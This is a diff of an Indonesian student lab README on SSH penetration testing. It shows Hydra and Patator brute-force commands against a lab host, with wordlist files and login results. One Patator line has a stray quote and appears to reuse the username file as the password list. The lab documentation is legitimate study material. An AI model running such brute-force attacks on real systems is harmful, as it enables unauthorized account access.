@@ -353,28 +353,44 @@ Pada tahap uji penetrasi tanpa defense ini akan ada 5 skenario :
 
   **1.**username="adnan"   password="admin"     (benar)
   
-  Perintah:"hydra -l adnan -p admin -s 5000 10.151.43.5 ssh" successfully 1 valid password found
+  Perintah:"hydra -l adnan -p admin -s 5000 10.151.43.5 ssh" Hasil: successfully 1 valid password found
   ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/1.PNG)
   
   **2.**username="root"   password="admin"     (username salah)
   
-  Perintah:"hydra -l root -p admin -s 5000 10.151.43.5 ssh" 0 valid password found
+  Perintah:"hydra -l root -p admin -s 5000 10.151.43.5 ssh" Hasil: 0 valid password found
   ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/2.PNG)
   
   **3.**file username_benar.txt  file password_benar.txt
   
-  Perintah:"hydra -L username_benar.txt -P password_benar.txt -s 5000 10.151.43.5 ssh" succesfully
+  Perintah:"hydra -L username_benar.txt -P password_benar.txt -s 5000 10.151.43.5 ssh" Hasil: succesfully
   ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/3.PNG)
   
   **4.**file username_benar.txt  file password_salah.txt
   
-  Perintah:"hydra -L username_benar.txt -P password_salah.txt -s 5000 10.151.43.5 ssh" 0 valid password found
+  Perintah:"hydra -L username_benar.txt -P password_salah.txt -s 5000 10.151.43.5 ssh" Hasil: 0 valid password found
   ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/4.PNG)
   
   **5.**file username_salah.txt  file password_salah.txt
   
-  Perintah:"hydra -L username_salah.txt -P password_salah.txt -s 5000 10.151.43.5 ssh" 0 valid password found
+  Perintah:"hydra -L username_salah.txt -P password_salah.txt -s 5000 10.151.43.5 ssh" Hasil: 0 valid password found
   ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Hydra/5.PNG)
 
+* **Patator**
 
-    
+  **1.**username="adnan"   password="admin"     (benar)
+  
+  Perintah:"patator ssh_login host=10.151.43.5 port=5000 user=adnan password=admin" Hasil: sukses SSH-2.0-OpenSSH_6.6.lp1 Ubuntu-2ubuntu2.8
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Patator/1.PNG)
+  
+   **2.**username="root"   password="admin"     (salah)
+  
+  Perintah:"patator ssh_login host=10.151.43.5 port=5000 user=root password=admin" Hasil: Authentication failed
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Patator/2.PNG)
+  
+    **3.**file username_benar.txt  file password_benar.txt
+  
+  Perintah:patator ssh_login host=10.151.43.5 port=5000 user=FILE0 password=FILE1 0=username_benar.txt 1=username_benar.txt" Hasil: sukses SSH-2.0-OpenSSH_6.6.lp1 Ubuntu-
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Patator/3_1.PNG)
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Patator/3_2.PNG)
+  ![alt text](https://github.com/panagua/PKSJ_Kelompok_x/blob/master/Patator/3_3.PNG)
